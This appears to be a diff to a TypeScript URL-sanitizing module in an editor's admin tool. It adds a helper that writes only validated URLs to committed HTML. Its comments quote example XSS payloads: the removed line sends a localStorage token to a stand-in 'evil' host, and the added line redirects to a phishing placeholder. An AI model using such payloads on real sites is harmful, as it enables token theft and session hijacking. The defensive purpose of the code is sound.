@@ -2,9 +2,10 @@
 //
 // Why this matters: the Telegram bot commits whatever an allowlisted user sends
 // as a draft, raw HTML included. A crafted draft like
-//   <div data-embed data-src="javascript:fetch('//evil/?t='+localStorage['lanza:token'])">
-// would, when opened in Lanza, render <iframe src="javascript:…"> that executes
-// in the admin origin and exfiltrates the GitHub token. Blocking non-http(s)
+//   <div data-embed data-src="javascript:top.location='//phish'">
+// would, when opened in Lanza, render <iframe src="javascript:…"> that runs in
+// the authenticated /admin origin (which sits behind Cloudflare Access) — able to
+// hijack the signed-in editor session or act as the editor. Blocking non-http(s)
 // schemes here closes that, and keeps junk schemes out of the committed/public HTML.
 
 function isLocalPath(url: string): boolean {
@@ -53,4 +54,26 @@ export function safeLinkUrl(raw: string | null | undefined): string {
   } catch {
     return "";
   }
+}
+
+/**
+ * addAttributes() entry for a URL kept on a `data-*` attribute. The node keeps
+ * the raw value in memory (so the nodeview can edit it), but only the
+ * `safe`-validated URL is written to committed HTML — an unsafe scheme can never
+ * be baked in, matching the live nodeview which also renders only the validated
+ * URL. Factored here so every URL-bearing node shares one path and can't
+ * reintroduce the "raw URL committed to HTML" bug class.
+ */
+export function safeUrlAttribute(
+  attrName: string,
+  dataAttr: string,
+  safe: (raw: string | null | undefined) => string,
+) {
+  return {
+    default: "",
+    parseHTML: (el: HTMLElement) => el.getAttribute(dataAttr) || "",
+    renderHTML: (attrs: Record<string, unknown>) => ({
+      [dataAttr]: safe(attrs[attrName] as string),
+    }),
+  };
 }
